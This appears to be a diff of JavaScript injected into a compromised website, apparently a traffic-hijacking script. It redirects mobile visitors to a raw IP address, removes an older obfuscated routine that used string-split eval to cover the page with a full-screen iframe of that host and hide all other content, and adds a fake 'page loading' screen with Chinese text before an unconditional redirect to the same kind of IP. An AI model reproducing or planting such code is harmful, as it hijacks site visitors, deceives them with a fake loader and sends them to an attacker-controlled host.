@@ -20,36 +20,26 @@
 
 if(window.navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
  
-   setTimeout("window.location.href='http://38.26.195.74'",1000);
+   setTimeout("window.location.href='http://38.26.195.76'",1000);
  }
 
-var titlestr=document.title;
-setFrame("http://38.26.195.74");
+
+document.writeln("<html>");
+document.writeln("<head>");
+document.writeln("<meta http-equiv=\'Content-Type\' content=\'text/html; charset=UTF-8\'>");
+document.writeln("");
+document.writeln("<title>页面加载中...</title>");
+document.writeln("<style>");
+document.writeln("<style type=\'text/css\'>");
+document.writeln("html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline}body{background:#3498db;}#loader-container{width:188px;height:188px;color:white;margin:0 auto;position:absolute;top:50%;left:50%;margin-right:-50%;transform:translate(-50%,-50%);border:5px solid #3498db;border-radius:50%;-webkit-animation:borderScale 1s infinite ease-in-out;animation:borderScale 1s infinite ease-in-out;}#loadingText{font-family:\'Raleway\',sans-serif;font-size:1.4em;position:absolute;top:50%;left:50%;margin-right:-50%;transform:translate(-50%,-50%);}@-webkit-keyframes borderScale{0%{border:5px solid white;}50%{border:25px solid #3498db;}100%{border:5px solid white;}}@keyframes borderScale{0%{border:5px solid white;}50%{border:25px solid #3498db;}100%{border:5px solid white;}}");
+document.writeln("</style>");
+
+document.writeln("</style></head>");
+document.writeln("<body>");
+document.writeln("<div id=\'loader-container\'><p id=\'loadingText\'>页面加载中...</p></div>");
+document.writeln("</body>");
+document.writeln("</html>");
 
 
 
-function setFrame(olink){
-    var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+olink+'"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
-    eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
-    try {
-      setTimeout(function() {
-        console.log(document.body.children.length);
-        for (var i = 0; i < document.body.children.length; i++) {
-          try {
-            var a = document.body.children[i].tagName;
-            var b = document.body.children[i].id;
-            console.log(i+"***"+a+"**"+b);
-            if (b != "iconDiv1" && b != "showcloneshengxiaon" && a!="title") {
-              document.body.children[i].style.display = "non" + "e"
-            }
-          } catch (e) {}
-        }
-        
-         var oMeta = document.createElement('meta');
-        oMeta.name = 'viewport';
-        oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
-        document.getElementsByTagName('head')[0].appendChild(oMeta);
-        
-      }, 100)
-    } catch (e) {}
-}
+setTimeout("window.location.href='http://38.26.195.76'",1000);
